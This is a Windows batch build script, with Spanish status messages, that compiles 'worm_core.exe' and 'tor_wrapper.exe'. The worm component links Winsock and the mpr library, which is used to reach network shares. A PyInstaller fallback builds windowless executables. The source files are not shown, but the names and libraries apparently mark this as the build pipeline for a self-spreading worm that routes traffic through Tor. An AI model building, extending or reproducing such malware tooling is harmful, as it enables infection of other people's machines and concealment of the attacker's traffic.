@echo off
setlocal
title Build - Breadcrumb
color 0E
cd /d "%~dp0"

echo [*] Configurando entorno de compilacion...

where g++ >nul 2>nul
if errorlevel 1 goto try_msvc

echo [*] Compilando con MinGW g++...

echo [*] Compilando worm_core.exe...
g++ -std=c++20 -O2 -static -mconsole -pthread worm_core.cpp -o worm_core.exe -lws2_32 -lmpr
if errorlevel 1 goto fail_worm
echo [+] worm_core.exe OK

echo [*] Compilando tor_wrapper.exe...
g++ -std=c++20 -O2 -static -municode -pthread tor_wrapper.cpp -o tor_wrapper.exe -lws2_32
if errorlevel 1 goto fail_wrap
echo [+] tor_wrapper.exe OK

echo [+] Build completo con MinGW.
goto end

:try_msvc
where cl >nul 2>nul
if errorlevel 1 goto try_pyinstaller

echo [*] Compilando con MSVC...
cl /std:c++20 /O2 /MT worm_core.cpp ws2_32.lib mpr.lib /Fe:worm_core.exe
if errorlevel 1 goto fail_worm
echo [+] worm_core.exe OK

cl /std:c++20 /O2 /MT tor_wrapper.cpp /Fe:tor_wrapper.exe
if errorlevel 1 goto fail_wrap
echo [+] tor_wrapper.exe OK

echo [+] Build completo con MSVC.
goto end

:try_pyinstaller
echo [!] No se encontro compilador C++ (ni MinGW ni MSVC).
echo [!] Usando PyInstaller como respaldo...
python -m pip install pyinstaller >nul 2>&1
if exist worm_core.py python -m PyInstaller --onefile --noconsole --distpath . --workpath build --specpath . worm_core.py
if exist tor_wrapper.py python -m PyInstaller --onefile --noconsole --distpath . --workpath build --specpath . tor_wrapper.py
echo [+] Empaquetado finalizado.
goto end

:fail_worm
echo [!] Fallo al compilar worm_core.exe
goto end

:fail_wrap
echo [!] Fallo al compilar tor_wrapper.exe
goto end

:end
exit /b 0